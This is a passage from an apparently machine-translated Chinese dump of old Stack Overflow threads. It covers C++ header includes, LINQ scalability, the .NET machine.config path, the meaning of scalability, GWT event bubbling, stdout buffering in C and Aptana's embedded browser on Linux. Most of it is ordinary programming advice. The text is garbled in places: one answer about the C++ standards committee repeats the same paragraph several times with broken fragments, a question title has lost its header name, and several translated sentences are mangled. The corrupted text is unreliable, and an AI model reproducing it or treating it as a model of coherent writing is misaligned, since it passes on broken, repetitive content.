> 
> 时间：2008-10-18T00:15:29.040

在程序集上运行 peverify.exe 可能会产生有用的诊断信息。

[http://msdn.microsoft.com/en-us/library/62bwd2yd.aspx](http://msdn.microsoft.com/en-us/library/62bwd2yd.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-26T09:45:59.940

事实证明，由于 MSTest 中的一些异常，我得到了这个异常。切换到 xUnit.net，从那以后一切都很好。

# c++ - 对比 与“iostream.h”

> ID：214230
> 
> 赞同：37
> 
> 时间：2008-10-18T00:08:06.340
> 
> 标签：c++, iostream

在 C++ 中包含头文件时，...之间有什么区别？

1) 在将 .h 包装在 < > 符号中时，包括 .h 还是不包括 .h？

```
#include <iostream> vs. #include <iostream.h> 
```

2）将标题名称用双引号括起来还是用 < > 符号括起来？

```
#include <iostream.h> vs. #include "iostream.h" 
```

提前致谢！

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2008-10-18T00:16:14.500

简而言之：

`iostream.h`已弃用——它是原始的 Stroustrup 版本。`iostream`是标准委员会的版本。通常，编译器将它们都指向同一事物，但一些较旧的编译器不会具有较旧的编译器。在某些奇怪的情况下，它们既存在又不同（以支持遗留代码），然后您必须具体。

`""`与`<>`简单地意味着在进入库之前检查头文件的本地目录（在大多数编译器中）。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-18T00:11:41.420

这是一篇不错的链接[文章。](http://members.gamedev.net/sicrane/articles/iostream.html)

总结一下，给出的理由：

> 标准委员会生成的 iostream 库版本与 CFront 实现有很大不同。{剪辑}
> 
> 为了简化转换，C++ 标准委员会声明包含标准 C++ 头文件的代码将使用缺少扩展的包含指令。这允许编译器供应商提供带有 .h 扩展名的旧式 C++ 库头文件和不带 .h 扩展名的新式头文件。

不使用 .h 版本的优点：

> 应该使用无扩展名版本的头文件而不是 .h 形式来编写新代码有几个原因。首先是在现代编译器上编译时此类代码的不可预测性。如前所述，使用 .h 标头的结果是特定于实现的。随着时间的推移，给定编译器使用旧样式库的机会会减少。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-11-01T02:02:02.363

作为标准委员会 (X3J16) 中提议取消 .h 的人，我的初衷是解决关于 .h、.H、.hpp、.hxx 或 .h++ 文件扩展名的争论；或者某些人希望标准中没有暗示这是磁盘上文件的名称，以便允许 IDE 将预编译的标头信息从内部某个地方（如资源文件）甚至是编译器。

虽然 Unix 认为文件名是单个字符串并且实际上并没有识别扩展名的概念，但 DEC 操作系统有将名称与扩展名分开的传统，如果在特定上下文中省略它，则提供“默认扩展名”。这就是我想到将它留给实现使用实现想要使用的任何扩展的想法的地方，它允许实现甚至没有这个文件在磁盘上。（当时我是委员会的 DEC 代表。）

区分标准和准标准头是一个额外的好处。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-18T00:17:38.927

<iostream> 是标准方式（也是唯一一种保证有效的方式）。在 gcc 上，<iostream.h>（可能需要包含在 <backward/iostream.h> 中）将相关声明拉到全局命名空间（因此您不需要 std:: 命名空间前缀）。

“iostream.h”将首先从包含您的源代码的目录中尝试，因为“”用于您项目的标头。<> 应始终用于系统标头，而 "" 应始终用于您自己的标头。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-18T00:14:21.010

通常 <> 用于系统或标准库文件，而 "" 用于项目文件。如果您的编译器在本地搜索并且找不到它，我不会感到惊讶，它默认为标准库版本。

至于.h，我认为如果你使用C实际上并不重要。在C++中，我模糊地记得有一个新版本和一个旧版本，没有h它应该是新版本，但我什至不确定旧版本是否仍然存在。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-18T00:39:01.800

第一个答案的简单答案是 iostream.h 不存在，至少在 GCC 实现中是这样。如果您在 *nix 上，请输入

% 定位 iostream.h
/usr/include/c++/3.4.3/backward/iostream.h

和

% 定位 iostream
/usr/include/c++/3.4.3/iostream
/usr/include/c++/3.4.3/backward/iostream.h

正如 Zee 的文章所说，iostream.h 是为了向后兼容。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-18T02:37:42.077

这确实是两个不同的问题。

*   具有相同名称的 .h 和无扩展名标头之间的区别是历史性的。带有 .h 扩展名的那些来自最初的 C++ 标准，它没有一些现代特性，例如命名空间和模板。新标准更简单地将相同的功能放在新的头文件中，以便能够使用这些新功能并保留旧 (.h) 文件以向后兼容遗留代码。

*   #include <...> 和#include "..." 格式之间的区别在于编译器查找文件的顺序。这通常取决于实现，但想法是 <> 格式首先在系统包含目录中查找，而 "" 与 #include 的源文件首先查找相同的目录。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-06-05T01:38:42.777

关于标准 C++ 头文件的名称，在 X3J16 的早期（前 2 年），我们面临着关于标准 C++ 头文件的扩展名应该是什么的争论。当时被各种供应商使用（并且受到某些操作系统对文件名的限制的影响）我相信有.h、.H、.h++、.hpp、.HXX，可能还有其他。在图书馆小组会议上，我建议我们关闭扩展名，并让实现提供默认文件扩展名（如果包含行中没有），或者使用名称作为数据库中的键如果需要，预编译头文件。[虽然类 Unix 系统将文件名和“扩展名”视为单个字符串，但我在委员会中代表 DEC，许多 DEC 操作系统将扩展名存储在目录中，作为与名称分开的字段。因此，DEC 操作系统有一个强大的传统，即根据什么程序出于什么目的访问文件来应用默认扩展名。告诉汇编程序“X,Y=Z”可能会导致读取输入文件 Z.MAC（宏）并写入输出文件 X.OBJ 和 Y.LST。] 无论如何，它避免了一场长期的、没有胜利的辩论，所以小组同意它，安迪·科尼格（Andy Koenig）将小组对此（以及其他）的结论提交给接受它的整个委员会。我觉得有些有趣的是，实现忽略了他们可以应用他们选择的默认扩展名的全部要点（我认为这对编辑器和其他工具很有用）并且只是将扩展名从文件名中删除。因此，DEC 操作系统有一个强大的传统，即根据什么程序出于什么目的访问文件来应用默认扩展名。告诉汇编程序“X,Y=Z”可能会导致读取输入文件 Z.MAC（宏）并写入输出文件 X.OBJ 和 Y.LST。] 无论如何，它避免了一场长期的、没有胜利的辩论，所以小组同意它，安迪·科尼格（Andy Koenig）将小组对此（以及其他）的结论提交给接受它的整个委员会。我觉得有些有趣的是，实现忽略了他们可以应用他们选择的默认扩展名的全部要点（我认为这对编辑器和其他工具很有用）并且只是将扩展名从文件名中删除。因此，DEC 操作系统有一个强大的传统，即根据什么程序出于什么目的访问文件来应用默认扩展名。告诉汇编程序“X,Y=Z”可能会导致读取输入文件 Z.MAC（宏）并写入输出文件 X.OBJ 和 Y.LST。] 无论如何，它避免了一场长期的、没有胜利的辩论，所以小组同意它，安迪·科尼格（Andy Koenig）将小组对此（以及其他）的结论提交给接受它的整个委员会。我觉得有些有趣的是，实现忽略了他们可以应用他们选择的默认扩展名的全部要点（我认为这对编辑器和其他工具很有用）并且只是将扩展名从文件名中删除。告诉汇编程序“X,Y=Z”可能会导致读取输入文件 Z.MAC（宏）并写入输出文件 X.OBJ 和 Y.LST。] 无论如何，它避免了一场长期的、没有胜利的辩论，所以小组同意它，安迪·科尼格（Andy Koenig）将小组对此（以及其他）的结论提交给接受它的整个委员会。我觉得有些有趣的是，实现忽略了他们可以应用他们选择的默认扩展名的全部要点（我认为这对编辑器和其他工具很有用）并且只是将扩展名从文件名中删除。告诉汇编程序“X,Y=Z”可能会导致读取输入文件 Z.MAC（宏）并写入输出文件 X.OBJ 和 Y.LST。] 无论如何，它避免了一场长期的、没有胜利的辩论，所以小组同意它，安迪·科尼格（Andy Koenig）将小组对此（以及其他）的结论提交给接受它的整个委员会。我觉得有些有趣的是，实现忽略了他们可以应用他们选择的默认扩展名的全部要点（我认为这对编辑器和其他工具很有用）并且只是将扩展名从文件名中删除。s 对此（除其他外）的结论给接受它的整个委员会。我觉得有些有趣的是，实现忽略了他们可以应用他们选择的默认扩展名的全部要点（我认为这对编辑器和其他工具很有用）并且只是将扩展名从文件名中删除。s 对此（除其他外）的结论给接受它的整个委员会。我觉得有些有趣的是，实现忽略了他们可以应用他们选择的默认扩展名的全部要点（我认为这对编辑器和其他工具很有用）并且只是将扩展名从文件名中删除。

# .net - LINQ 的可扩展性如何？

> ID：214233
> 
> 赞同：16
> 
> 时间：2008-10-18T00:11:21.187
> 
> 标签：.net, linq, scalability

最近与同事的对话对这个问题产生了不同的观点。SO成员，你说什么？

我知道，即使是可扩展性的概念也可以用许多不同的方式和背景来理解，但这是讨论的一部分。对于可扩展性的真正含义，每个人似乎都有不同的看法。我也很想看到这里的变化。事实上，我只是针对这个概念发布了一个[问题。](https://stackoverflow.com/questions/214246/what-does-scalability-mean-to-you)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-18T00:20:39.793

我猜想最好的检查方法是编写基准测试，但在我看来，LINQ 有可能进行手写类似代码所没有的优化。我不知道它如何利用这些优势。

LINQ 让您表达您想要的，而不是如何生成它。一个明显的优势是 LINQ 可以自动并行化（请参阅[PLINQ](http://msdn.microsoft.com/en-us/magazine/cc163329.aspx)）。

LINQ 的另一个优点是它是惰性的，因此您可以执行计算，根据需要从集合中绘图。您可以手动编写等效的代码，但在 LINQ 中正确使用可能要容易得多。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-19T09:48:50.627

在我们所做的测试中，LINQ to objects (ForEach) 比 foreach 循环慢了大约 2 倍。

LINQ to SQL（MS SQL 数据库）几乎比使用数据读取器直接查询慢**10 倍**，大部分时间使用从表达式树创建 SQL（因此，您将受 CPU 限制并且数据库将处于空闲状态）为避免这种情况，您必须使用编译查询。

[有关更多信息，请参阅此](http://blogs.msdn.com/ricom/archive/2007/06/22/dlinq-linq-to-sql-performance-part-1.aspx)。帖子中的大多数信息对于 .NET 3.5 SP1 仍然有效。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-10-18T00:44:00.963

这个问题有点像问“集合的可扩展性如何？”

让我们来谈谈 LINQ to 对象。一般而言，就大多数`IEnumerable<T>`迭代基础集合中的每个项目的实现而言，LINQ 具有很大的扩展潜力。创建一个`List<Foo>`包含一千万个项目的内容，如下所示：

```
var list = from Foo f in fooList
           where f.Value = "Bar"
           select f; 
```

会很慢。但这真的不是 LINQ 的错。是你给了它一千万个项目的清单。

如果 LINQ 不存在，您可以像处理它一样处理它：通过构建字典和 SortedLists 等来帮助您减少搜索空间。

LINQ 可以通过延迟查询执行来*提高*可伸缩性（嗯，使可伸缩性更容易获得）。您可以使用一系列 LINQ 查询替换创建列表、将其过滤到新列表、将其过滤到新列表等的简单方法：

```
var list1 = from Foo f in fooList where f.Value1 = "Bar" select f;
var list2 = from Foo f in list1 where f.Value2 = "Baz" select f;
var list3 = from Foo f in list2 where f.Value3 = "Bat" select f; 
```

当（并且如果）有必要遍历最终列表时，所有这些都将在一次遍历基础集合中执行。不过，这又不是什么新鲜事：如果您没有 LINQ，您可能最终会用做同样事情的方法替换您的幼稚方法。但是 LINQ 让它变得容易多了。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-10-19T10:19:12.673

在我看来，LINQ 旨在从开发的角度简化事情，而不是解决可伸缩性问题。

事实上，使用 LINQ 隐藏了很多复杂性，从而使事情变得如此简单，如果*不负责任地使用它，**可能会*导致可伸缩性问题。

 *其他答案中的例子比比皆是，但最重要的是：

*   如果您正在查询一个对象集合，则不能忽略它的大小。当有几个对象要查询时，也许在模型中使用 LINQ 听起来不错……但是随着大小的增长，很明显查询应该发生在数据库中，而不是模型中。

*   如果您使用 LINQ 自动生成 SQL，据我所知，您无法为数据库提供有关如何编译查询的提示，例如`WITH (NOLOCK)`. 随着您的表大小增加，能够解决这些问题势在必行。

*   与上述类似，但可能更通用：当您解决数据库的可伸缩性问题时，您*必须*控制数据库正在做什么。拥有一种可以编译为 SQL 的语言，然后再将其编译为执行计划，从而消除了您的控制权。

*   如果您必须更改数据库模式以使其更具可伸缩性，并且您的代码与它紧密相关，因为您没有存储过程，会发生什么情况？

*   尽管看起来很简单，但您无法轻松更改 LINQ 提供程序：查询 SQL Server 与查询对象或查询 XML 不同。LINQ 非常相似。我确实希望我的一些初级开发人员继续“LINQ 狂欢”，因为这比学习如何在考虑可伸缩性的情况下做事更容易。

总之，我认为可以使用 LINQ 编写可扩展的代码，但必须小心使用它。没有杀手级*工具*，只有杀手级*代码*。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-18T00:20:21.043

这在很大程度上取决于您使用的是哪个 LINQ 提供程序以及您如何使用它。LINQ 可能并不以惊人的执行速度着称，而是为开发人员提供了更高的生产力。

根据[此](http://blogs.msdn.com/ricom/archive/2007/07/05/dlinq-linq-to-sql-performance-part-4.aspx)链接，即使使用某些 CTP，Linq to SQL 在某些情况下也已经比使用直接 SQL 更好。

如果您关心 Speed 并且大量使用 LINQ to objects ，那么[这里](http://www.codeplex.com/i4o)有一个 codeplex 项目（我认为），它可以为您提供 1000 倍的性能改进。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-18T00:36:13.523

您在某些方面关于可伸缩性的问题取决于您使用 LINQ 的目的。在业务应用程序中，您不会发现很多 SQL 命令正在执行——它们很慢并且必须在 DBMS 中编译。相反，您将看到大量存储过程调用。这些在 LINQ 中会稍微快一些。

请记住，LINQ to SQL 等是建立在 ADO.NET 的 TOP 之上的——它们并不是完全不同的方法或任何东西。当然，LINQ to XML 将在幕后使用不同的 API。这将很像一个编译器——人类总是可以做出一些可能更快的优化，但在大多数情况下，这些 API 将能够生成比您自己编写的代码更快且错误更少的代码。

在横向扩展方面，如果您想稍微分发数据，或者您可以使用 SQL 服务器复制，您总是可以将 LINQ 放在 Web 服务后面。它的可扩展性不应低于 ADO.NET。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-18T00:53:59.523

可扩展性和性能是两个不同但相关的东西。如果要衡量性能，则需要查看一个盒子可以支持多少用户（例如）。当您测量可扩展性时，您添加另一个盒子，看看您是否可以支持原始数量的两倍？不太可能，你可能只增加了 75% 的处理能力，下一个只增加了原始单位的 50%，所以它很快就降到了零。无论您以该速度添加多少个框，您都很幸运能够将支持的用户数量翻倍。这就是可扩展性。

你的 Linq 模块如何扩展可能更多地取决于数据库、机器有多强大、数据库的设计是什么、你的应用程序的设计是什么。

您经常会看到应该揭示一些结论性的微基准，但它们从未这样做，因为它们只是整个问题的关键洞。

您可以在此处提取旧的 20/80 示例。可能 20% 是关于工具的，80% 是关于构成应用程序的各种有形的东西。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-22T05:10:03.920

如果您正在寻找一个现实生活中的示例，stackoverflow 大量使用 Linq，请查看此[帖子/播客](http://www.hanselman.com/blog/HanselminutesPodcast134StackOverflowUsesASPNETMVCJeffAtwoodAndHisTechnicalTeam.aspx)。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-12-08T21:52:38.323

使用 Linq to SQL 框架按需缓存和加载对象是有代价的。如果一个对象可以按需延迟加载其自身的一部分，那么很可能每个对象中都存在对数据上下文的引用。顺便说一句，数据上下文还缓存了曾经从它请求过的每个对象。这意味着，如果您保留其中一个对象（在缓存中或只是因为您稍后使用它），您不仅保留了该对象，而且保留了数据上下文所请求的每个对象。这些将永远不会被垃圾收集，因为它们仍在被引用。

如果所有目标的生命周期都很短，并且应用程序每次执行新工作时都会创建新的 DataContext，这不是问题。但是我可以看到，如果有人不知道每个对象都会带来额外的负担，它会如何产生可伸缩性问题。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2010-09-08T19:20:17.870

Linq 在很多方面都是可扩展的。

一个方面是 linq 背后的规范实现，它允许将 Expression 解释为在进程外、以不同的语言（Linq2Sql、Linq2Hibernate）或在分布式计算环境中（例如 map-reduce 集群）（[DryadLINQ](http://research.microsoft.com/en-us/projects/dryadlinq/)）

另一个方面是 linq 为语言提供的语义。如果您的提供程序支持延迟加载，或者您可以并行化或优化查询（PLINQ 或 i4o），您可以迭代数十亿个对象而无需将集合填充到内存中。

# c# - machine.config 路径

> ID：214239
> 
> 赞同：5
> 
> 时间：2008-10-18T00:14:53.207
> 
> 标签：c#, .net

如何从 .Net 应用程序获取 machine.config 的路径？它应该会根据应用程序的 .Net 版本自动获取正确的路径。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-18T00:16:07.557

[System.Runtime.InteropServices.RuntimeEnvironment.SystemConfigurationFile](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.runtimeenvironment.systemconfigurationfile.aspx)应该给你那个值..

# architecture - 可扩展性对您意味着什么？

> ID：214246
> 
> 赞同：18
> 
> 时间：2008-10-18T00:19:21.310
> 
> 标签：architecture, scalability

我发布了一个关于 linq 的可扩展性的[类似问题](https://stackoverflow.com/questions/214233/how-scalable-is-linq)。在最近的一些对话中，对于可扩展性的实际含义有很多不同的看法，所以这也激发了我提出这个问题。可扩展性对您意味着什么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-18T00:41:10.923

我从两个角度看待可扩展性：

**扩大**

如果我在运行某些东西的机器上添加更多 RAM，我可以获得多少额外的性能和容量？如果一个应用程序可以处理 300 个以上的连接并且当我向我的服务器添加 2 GB 的 RAM 时运行速度提高 15%，而另一个应用程序只能处理 100 个以上的连接并且运行速度提高 5%，那么应用程序 A 显然更具可扩展性。

**向外扩展**

现在，如果我在我的设置中添加更多的盒子，我可以获得多少额外的性能和容量？我可以设置 Web 前端来处理更多的客户端流量吗？如果有，是否有线性增长？如果我添加 3 个框，我可以让 3 倍以上的用户访问我的网站吗？我可以添加更多数据库来分配数据负载吗？我可以扩展多线程吗？如果我可以轻松地将一台机器添加到我的网络以增加我的应用程序的容量，那么它是可扩展的。

顺便说一下，这是 n 层的主要驱动器之一。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-18T00:28:53.740

可扩展性意味着在以下两个领域中处理增长的能力：

1）易于添加新功能，修复错误。让代码做这些新东西有多难？虽然这在某些方面可能是可维护性的，但这也是您是否可以构建代码以轻松处理更大规模的问题。

2) 能够处理越来越大的负载，这可能是 Web 开发中的多个请求，或者是一个简单的数据库驱动网站的更大数据集，例如，您是否可以制作一个应用程序来处理仍然被视为“快的”？

一般来说，对我来说，可扩展性意味着增长的能力。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-18T02:55:35.707

我认为可扩展性在没有上下文的情况下毫无意义。

当我被问及系统的可扩展性时，我首先需要知道的是它的利用率预计会以何种方式增长。它会吸引更多用户吗？现有用户会更多地使用它吗？它的功能集会增长吗？它目前支持的交易组合会改变吗？用户体验需要改变吗？

（好的，所以所有这些问题的答案通常都是“是”；然后在这些问题前面加上“如何”这个词。）

举一个不完全虚构的例子：一个系统目前只支持很少的用户，而且它的用户群预计会迅速增长，如果 DBA 必须花费两个小时手动运行从电子邮件消息中挑选出来的信息的查询，那么它就会出现严重的扩展问题。时间他必须建立一个新帐户。这不是可以通过添加更多资源来解决的问题，除非您将 DBA 包括在要添加的资源列表中（并且有很多原因不能很好地扩展）。

或者想象一个社交网站推出了令人兴奋的新功能，您可以查看您的朋友是否在线，并通过漂亮的 Ajax-y UI 与他们聊天。突然之间，在用户群没有增加的情况下，您的服务器每天处理的 HTTP 请求数量增加了 20 倍，您对数据库可扩展性的担忧也逐渐消失。（当然，除非您在聊天应用程序中涉及数据库。好主意！）

当然，使您的 Web 应用程序无状态以便您可以添加 Web 服务器，使网页具有幂等性以便您可以添加代理，设计您的应用程序以便您可以跨服务器分区您的数据库，这些都将使您的应用程序在各种方面。非常值得考虑这些东西。但更重要的是在开始战斗之前弄清楚你真正的敌人是什么。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-18T00:23:17.153

我回答了这个问题，好像你的意思是快，但那是因为我不想成为一个混蛋:)——意思是，我不想开始讨论可扩展性的含义。我认为可扩展性是：向系统添加资源会提高其性能。

从这个意义上说，PLINQ 是可扩展的，因为添加更多内核会使其运行得更快。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-18T00:27:03.510

只是为了添加到@Lou Franco 的帖子。

PLINQ 甚至在某些开销有限的场景中具有怪异的“超级线性”性能（根据他们的一些演示）。试试看。

如果您是 C++ 人，Microsoft 还希望发布显然没有与之相关的运行时成本的并发功能以及其他基于任务的并发工具来帮助您更好地调用。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-19T15:53:18.943

我认为可扩展性是衡量性价比曲线平滑度的指标。

也就是说，如果你能在计算资源上花一点点，得到一个低性能的系统，然后逐渐增加资源，你就能得到一个比例更好的系统，它是可扩展的。如果您必须以昂贵的块添加资源，以获得少于线性的改进，那么它是不可扩展的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-18T00:35:29.937

可扩展性 - 系统使用额外资源来增加容量或吞吐量的能力。其他资源，例如驱动器、内存、网卡、处理器或机器。

我不直接将可扩展性与功能增长联系起来，尽管在系统的规模限制下向系统添加功能可能是不可能的。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-18T01:07:58.250

这些天，特别是对于 web 应用程序，但在某些情况下，对于企业应用程序，水平可扩展性是你想要的，

我可以通过添加更多商品硬件来处理更多（流量、数据、处理）吗？甚至使用“云服务器”亚马逊 ec2、谷歌应用引擎等？

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-18T02:15:51.480

可扩展意味着我可以将 n 个资源塞进一个系统，它会在 O(log(n)) 和 O(n log n) 之间的空间和时间上增长。这有点不切实际，但这就是我对“可扩展”的看法。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-19T15:14:18.430

哇！，大字……

我在每个项目中都重新定义它，因为它取决于客户想要什么。

可扩展性并不总是与增加处理/存储容量有关，但也可以包括对许多输入和许多输出的支持。

# java - 阻止事件在 GWT 中冒泡

> ID：214262
> 
> 赞同：5
> 
> 时间：2008-10-18T00:27:13.230
> 
> 标签：java, events, gwt

我有以下代码片段，changeTextArea 是一个 TextArea 对象。

```
changeTextArea.addKeyboardListener(new KeyboardListenerAdapter()
  public void onKeyPress( Widget sender, char keyCode, int modifier){
    //do something
    //I WISH TO STOP THE EVENT THAT MAPS TO THIS KEYPRESS FROM BUBBLING ANY FURTHER
  }
} 
```

我将如何阻止导致调用此方法的事件从 changeTextArea 冒泡到包含 changeTextArea 的 Panels/Widgets/Composites/Whatever 中。简而言之，我如何阻止它进一步冒泡。任何帮助将不胜感激（尤其是代码示例）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-18T05:29:20.827

据我所知，您无法通过键盘侦听器执行此操作，但可以通过使用 DOM 类添加事件预览来实现：

```
DOM.addEventPreview(EventPreview preview) 
```

然后当你得到事件时：

```
onEventPreview(Event event) 
```

您应该返回 false，表示您要取消该事件。Event 对象也支持这种方法：

```
public final void cancelBubble(boolean cancel) 
```

取消给定事件的冒泡。这将阻止事件传播到父元素。

您可以在此处找到更多详细信息：http: [//google-web-toolkit.googlecode.com/svn/javadoc/1.5/index.html ?overview-summary.html](http://google-web-toolkit.googlecode.com/svn/javadoc/1.5/index.html?overview-summary.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-20T16:59:52.927

您绝对可以在任何可以访问事件的代码中使用事件的 cancelBubble() 和 preventDefault() 方法。无需进行活动预览...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2010-12-22T01:11:07.103

您可以调用发送方的 cancelKey() 事件。这是一个仅允许输入数字的示例，所有其他键都被拒绝。

私有类 RowColChangeHandler 实现 KeyPressHandler {

```
 public void onKeyPress(KeyPressEvent event) {
        char keyCode = event.getCharCode();
        if(keyCode <48 || keyCode >57)
        {
            ((TextArea)event.getSource()).cancelKey();
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-28T13:53:18.143

你可以通过做 `event.doit = false`

# c - C相当于自动刷新（每次写入后刷新标准输出）？

> ID：214271
> 
> 赞同：32
> 
> 时间：2008-10-18T00:36:58.093
> 
> 标签：c, stdio

在 Perl 中，我可以输入：

```
$|++; 
```

并且打印到 STDOUT 的任何内容都将自动被 fflush() 处理。

C中是否有等价物？换句话说，有什么方法可以告诉 stdio 在每次 printf() 之后自动刷新 stdout，就像它自动刷新 stderr 的方式一样？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2008-10-18T00:45:41.117

试试`setvbuf(stdout, NULL, _IONBF, 0)`。它更改`stdout`为无缓冲 ( `_IONBF`) 模式。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-10-18T00:46:06.077

我没有这样做，但`_IOLBF`将是正确的答案。

```
$ man setvbuf
NAME
       setvbuf — assign buffering to a stream

SYNOPSIS
       #include <stdio.h>

       int setvbuf(FILE *restrict stream, char *restrict buf, int type,
           size_t size);

DESCRIPTION
       The functionality described on this reference page is aligned with
       the ISO C standard. Any conflict between the requirements described
       here and the ISO C standard is unintentional. This volume of
       POSIX.1‐2008 defers to the ISO C standard.

       The setvbuf() function may be used after the stream pointed to by
       stream is associated with an open file but before any other operation
       (other than an unsuccessful call to setvbuf()) is performed on the
       stream. The argument type determines how stream shall be buffered, as
       follows:

        *  {_IOFBF} shall cause input/output to be fully buffered.

        *  {_IOLBF} shall cause input/output to be line buffered.

        *  {_IONBF} shall cause input/output to be unbuffered. 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-18T00:43:48.093

看看 setbuf() 和 setvbuf()。

# php - 如何在 Linux 上为 Aptana 设置内部浏览器

> ID：214272
> 
> 赞同：2
> 
> 时间：2008-10-18T00:37:09.963
> 
> 标签：php, linux, aptana

我下载了 Aptana_Studio_Setup_Linux.zip 包，解压并运行 ./AptanaStudio。它开始正常，但报告一个问题：

*无法创建此编辑器的嵌入式浏览器小部件。它要么不适用于您的操作系统，要么需要配置系统才能支持嵌入式浏览器。*

之后，它会在外部浏览器 (Mozilla) 中打开“欢迎页面”，但是当我单击安装 PHP 支持的链接时，它不会打开目标目标。难怪，因为链接格式为：com.aptana....等。即反过来写。我假设此类链接仅适用于内部浏览器。

如果我查看详细信息，我会收到以下错误消息：

```
No more handles [Unknown Mozilla path (MOZILLA_FIVE_HOME not set)]
org.eclipse.swt.SWTError: No more handles [Unknown Mozilla path (MOZILLA_FIVE_HOME not set)]
at org.eclipse.swt.SWT.error(SWT.java:3400)
at org.eclipse.swt.browser.Browser.<init>(Browser.java:138)
at org.eclipse.ui.internal.browser.BrowserViewer.<init>(BrowserViewer.java:224)
at org.eclipse.ui.internal.browser.WebBrowserEditor.createPartControl(WebBrowserEditor.java:78)
at com.aptana.ide.intro.browser.CoreBrowserEditor.createPartControl(CoreBrowserEditor.java:138)
at org.eclipse.ui.internal.EditorReference.createPartHelper(EditorReference.java:596)
at org.eclipse.ui.internal.EditorReference.createPart(EditorReference.java:372)
at org.eclipse.ui.internal.WorkbenchPartReference.getPart(WorkbenchPartReference.java:566)
at org.eclipse.ui.internal.PartPane.setVisible(PartPane.java:290) 
```

等我希望这已经足够了。

我试图设置环境。多变的：

```
export MOZILLA_FIVE_HOME=/usr/lib/mozilla/ 
```

但是，它只会将错误消息更改为：

```
No more handles [NS_InitEmbedding /usr/lib/mozilla/ error -2147221164]
org.eclipse.swt.SWTError: No more handles [NS_InitEmbedding /usr/lib/mozilla/ error -2147221164]
at org.eclipse.swt.SWT.error(SWT.java:3400)
at org.eclipse.swt.browser.Browser.<init>(Browser.java:225)
at org.eclipse.ui.internal.browser.BrowserViewer.<init>(BrowserViewer.java:224)
at org.eclipse.ui.internal.browser.WebBrowserEditor.createPartControl(WebBrowserEditor.java:78)
at com.aptana.ide.intro.browser.CoreBrowserEditor.createPartControl(CoreBrowserEditor.java:138)
at org.eclipse.ui.internal.EditorReference.createPartHelper(EditorReference.java:596)
at org.eclipse.ui.internal.EditorReference.createPart(EditorReference.java:372) 
```

一开始我真的很想让 PHP 工作，但我也想最终解决整个内部浏览器问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-10-14T04:06:15.157

我碰巧遇到了这个：[https ://groups.google.com/forum/#!msg/xmind/5SjPTy0MmEo/PbPi0OGzqPwJ](https://groups.google.com/forum/#!msg/xmind/5SjPTy0MmEo/PbPi0OGzqPwJ)

其中建议运行：

```
sudo apt-get install libwebkitgtk-1.0-0 
```

应该解决问题。它对我有用，所以我想我会在这里分享。

FWIW，我在尝试玩游戏时来到了这里！在 Ubuntu 13.04 上运行的框架。使用 Scala-IDE。到目前为止，一切似乎都在工作......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-24T12:53:38.963

您需要从[mozilla.org](https://developer.mozilla.org/En/XULRunner)下载并安装 XULRunner ，并将 MOZILLA_FIVE_HOME 指向该目录。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-26T02:30:30.333

安装 xulrunner 后，您需要设置：

```
MOZILLA_FIVE_HOME=/usr/lib/xulrunner 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-12-11T18:08:15.540

您必须安装 XULRunner，然后编辑 eclipse.ini。

安装 xulrunner 后，在 eclipse.ini 中添加以下行解决了“没有更多句柄”的问题。

-Dorg.eclipse.swt.browser.XULRunnerPath=/opt/eclipse/xulrunner/

我正在使用 eclipse 3.63 和 ubuntu 12.04。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-26T16:49:15.230

**编辑：**为了在 Aptana 中获得 PHP 支持，不需要让内部浏览器工作。只需从“**帮助**”、“**软件更新**”菜单安装 PHP 支持。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-10-18T19:36:09.833

如果这是我认为您遇到的问题，只需安装 Firefox 2（与 FF3 一起）即可解决此问题。这是因为 Aptana 目前只能使用 FF2。希望他们能尽快解决这个问题。

如果您使用的是 Ubuntu，那实际上只是以下情况：

```
sudo apt-get install firefox-2 
```

自然，该过程将因不同的分布而异。

# matlab - How to set some custom variables on Matlab startup

> ID：214304
> 
> 赞同：5
> 
> 时间：2008-10-18T00:56:42.390
> 
